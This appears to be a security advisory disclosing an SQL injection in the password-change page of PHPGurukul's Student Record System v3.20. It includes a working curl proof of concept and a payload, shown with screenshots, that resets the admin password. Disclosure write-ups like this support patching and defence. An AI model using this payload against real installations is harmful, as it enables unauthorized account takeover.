# SQL Injection in Student Record System Using PHP and MySQL v3.20

- Vendor : PHPGurukul
- Product : Student Record System Using PHP and MySQL
- Version : 3.20
- Official Website: https://phpgurukul.com/student-record-system-php/

- Related Code file: change-password.php
- Injection parameter: currentpassword, newpassword

## Vulnerability Description
This SQL injection vulnerability occurs in Student Record System Using PHP and MySQL version 3.20.
The vulnerability affects the source code of the /change-password.php file.
If an authenticated user injects a malicious SQL query into the currentpassword, newpassword parameters, they can change another user's password Unauthorized.

#### Impact Assessment 
This vulnerability allows an authenticated attacker to manipulate SQL queries during the password change process, potentially leading to:
- Unauthorized password changes for other user accounts

- Affected Endpoint : http://127.0.0.1:8888/change-password.php
- PoC
    ```
    curl -i -s -k -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -b "PHPSESSID=lg6rlbg3j0f1iaqfdvdvs9c4i3" \
    -d "currentpassword=' or id='1' -- -&newpassword=sqli' where id='1' -- -&confirmpassword=test&submit=Change" \
    "http://127.0.0.1:8888/change-password.php"
    ```

1. The account information for the current system looks like this:
   ![1-pentest-20250829-0116](https://github.com/user-attachments/assets/8caf9f4f-cd0a-4bfc-86a9-4340c6f8a74f)

2. Login:
    ![1-pentest-20250829-0110](https://github.com/user-attachments/assets/46251dff-51ba-4fd7-a0ec-b51fecefb3a5)
    ![2-pentest-20250829-0110](https://github.com/user-attachments/assets/e796008d-d0f0-4781-b65e-b098f0fa9da2)

3. Users can try to change the password:
    ![1-pentest-20250829-0112](https://github.com/user-attachments/assets/b8a69872-7c26-4a6f-b7e6-a913a8f4a312)


4. Intercept the traffic with burp suite and inject the SQL injection payload:
   `Payload: ' or id='1' -- -&newpassword=sqli' where id='1' -- -`
   ![2-pentest-20250829-0112](https://github.com/user-attachments/assets/e99e3fae-7c43-4e1f-bc34-b0732b4d1329)
   ![1-pentest-20250829-0120](https://github.com/user-attachments/assets/b37ca5e7-97ab-428e-83ef-43507c020d8d)


5. The password for the admin account was changed to the string 'sqli'.
   ![cve8888 localhost studentrecorddb tbl_login phpMyAdmin 5 2 1 2025-08-29 at 12 28 43 AM](https://github.com/user-attachments/assets/366c66a1-2fd2-42dc-8d65-9b071c7f50ef)

